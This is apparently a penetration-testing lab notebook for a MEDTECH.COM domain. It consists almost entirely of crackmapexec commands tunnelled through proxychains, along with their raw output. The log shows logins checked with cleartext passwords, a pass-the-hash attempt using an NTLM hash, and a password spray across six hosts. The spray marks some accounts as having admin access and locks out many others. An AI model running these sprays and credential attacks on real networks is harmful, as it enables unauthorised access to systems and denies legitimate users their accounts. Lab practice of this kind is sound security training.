
crackmapexec (user joe)
```
proxychains crackmapexec smb 172.16.219.0-254 -u joe -p 'Flowers1' -d MEDTECH.COM
```

```
SMB         172.16.219.12   445    DEV04            [*] Windows 10.0 Build 20348 x64 (name:DEV04) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
SMB         172.16.219.11   445    FILES02          [*] Windows 10.0 Build 20348 x64 (name:FILES02) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
[proxychains] Strict chain  ...  127.0.0.1:9000 SMB         172.16.219.83   445    CLIENT02         [*] Windows 10.0 Build 22000 x64 (name:CLIENT02) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
 ...  172.16.219.12:445 SMB         172.16.219.82   445    CLIENT01         [*] Windows 10.0 Build 22000 x64 (name:CLIENT01) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
SMB         172.16.219.13   445    PROD01           [*] Windows 10.0 Build 20348 x64 (name:PROD01) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
 ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.12:445  ...  OK
SMB         172.16.219.12   445    DEV04            [+] MEDTECH.COM\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:9000 [proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.10:445  ...  172.16.219.101:445 <--socket error or timeout!
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.102:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.10:445  ...  OK
SMB         172.16.219.10   445    DC01             [+] MEDTECH.COM\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:9000 [proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.103:445  ...  172.16.219.11:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.11:445  ...  OK
SMB         172.16.219.11   445    FILES02          [+] MEDTECH.COM\joe:Flowers1 (Pwn3d!)
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.83:445 [proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.104:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.83:445  ...  OK
SMB         172.16.219.83   445    CLIENT02         [+] MEDTECH.COM\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:9000 [proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.105:445  ...  172.16.219.82:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.82:445  ...  OK
SMB         172.16.219.82   445    CLIENT01         [+] MEDTECH.COM\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.106:445 [proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.13:445  ...  OK
SMB         172.16.219.13   445    PROD01           [+] MEDTECH.COM\joe:Flowers1 
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.107:445 <--socket error or timeout!
```

offsec
```
proxychains crackmapexec smb 172.16.219.10-90 -u offsec -H 892d26cdf84d7a70e2eb3b9f05c425e -d MEDTECH.COM
```

```
failed
```

wario
```
proxychains crackmapexec smb 172.16.219.10-13 -u wario -p Mushroom! -d MEDTECH.COM
```

```
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.10:445  ...  OK
SMB         172.16.219.10   445    DC01             [+] MEDTECH.COM\wario:fdf36048c1cf88f5630381c5e38feb8e 
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.12:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.12:445  ...  OK
SMB         172.16.219.12   445    DEV04            [+] MEDTECH.COM\wario:fdf36048c1cf88f5630381c5e38feb8e 
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.11:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.11:445  ...  OK
SMB         172.16.219.11   445    FILES02          [+] MEDTECH.COM\wario:fdf36048c1cf88f5630381c5e38feb8e 
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.13:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.13:445  ...  OK
SMB         172.16.219.13   445    PROD01           [+] MEDTECH.COM\wario:fdf36048c1cf88f5630381c5e38feb8e 
```

```
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.83:445  ...  OK
SMB         172.16.219.83   445    CLIENT02         [+] MEDTECH.COM\wario:fdf36048c1cf88f5630381c5e38feb8e 
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.82:445  ...  OK
[proxychains] Strict chain  ...  127.0.0.1:9000  ...  172.16.219.82:445  ...  OK
SMB         172.16.219.82   445    CLIENT01         [+] MEDTECH.COM\wario:fdf36048c1cf88f5630381c5e38feb8e 
```

password spray
```
crackmapexec smb targets.txt -u users.txt -p password.txt -d MEDTECH.COM --continue-on-success 
```

```
SMB         172.16.219.10   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:MEDTECH.COM) (signing:True) (SMBv1:False)
SMB         172.16.219.11   445    FILES02          [*] Windows 10.0 Build 20348 x64 (name:FILES02) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
SMB         172.16.219.12   445    DEV04            [*] Windows 10.0 Build 20348 x64 (name:DEV04) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
SMB         172.16.219.82   445    CLIENT01         [*] Windows 10.0 Build 22000 x64 (name:CLIENT01) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
SMB         172.16.219.83   445    CLIENT02         [*] Windows 10.0 Build 22000 x64 (name:CLIENT02) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
SMB         172.16.219.13   445    PROD01           [*] Windows 10.0 Build 20348 x64 (name:PROD01) (domain:MEDTECH.COM) (signing:False) (SMBv1:False)
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\joe:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\joe:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\leon:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\leon:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\mario:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\mario:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\wario:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.10   445    DC01             [+] MEDTECH.COM\wario:Mushroom! 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\yoshi:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.10   445    DC01             [+] MEDTECH.COM\yoshi:Mushroom! 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\peach:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.10   445    DC01             [-] MEDTECH.COM\peach:Mushroom! STATUS_LOGON_FAILURE 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\joe:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\joe:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\leon:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\leon:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\mario:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\mario:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\wario:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.11   445    FILES02          [+] MEDTECH.COM\wario:Mushroom! 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\yoshi:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.11   445    FILES02          [+] MEDTECH.COM\yoshi:Mushroom! 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\peach:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.11   445    FILES02          [-] MEDTECH.COM\peach:Mushroom! STATUS_LOGON_FAILURE 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\joe:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\joe:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\leon:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\leon:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\mario:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\mario:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\wario:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.12   445    DEV04            [+] MEDTECH.COM\wario:Mushroom! 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\yoshi:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.12   445    DEV04            [+] MEDTECH.COM\yoshi:Mushroom! 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\peach:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.12   445    DEV04            [-] MEDTECH.COM\peach:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\joe:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\joe:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\leon:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\leon:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\mario:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\mario:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\wario:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.82   445    CLIENT01         [+] MEDTECH.COM\wario:Mushroom! 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\yoshi:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.82   445    CLIENT01         [+] MEDTECH.COM\yoshi:Mushroom! (Pwn3d!)
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\peach:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.82   445    CLIENT01         [-] MEDTECH.COM\peach:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\joe:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\joe:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\leon:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\leon:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\mario:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\mario:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\wario:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.13   445    PROD01           [+] MEDTECH.COM\wario:Mushroom! 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\yoshi:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.13   445    PROD01           [+] MEDTECH.COM\yoshi:Mushroom! 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\peach:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.13   445    PROD01           [-] MEDTECH.COM\peach:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\joe:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\joe:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\leon:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\leon:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\mario:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\mario:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\wario:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.83   445    CLIENT02         [+] MEDTECH.COM\wario:Mushroom! 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\yoshi:Flowers1! STATUS_LOGON_FAILURE 
SMB         172.16.219.83   445    CLIENT02         [+] MEDTECH.COM\yoshi:Mushroom! 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\peach:Flowers1! STATUS_ACCOUNT_LOCKED_OUT 
SMB         172.16.219.83   445    CLIENT02         [-] MEDTECH.COM\peach:Mushroom! STATUS_ACCOUNT_LOCKED_OUT 
```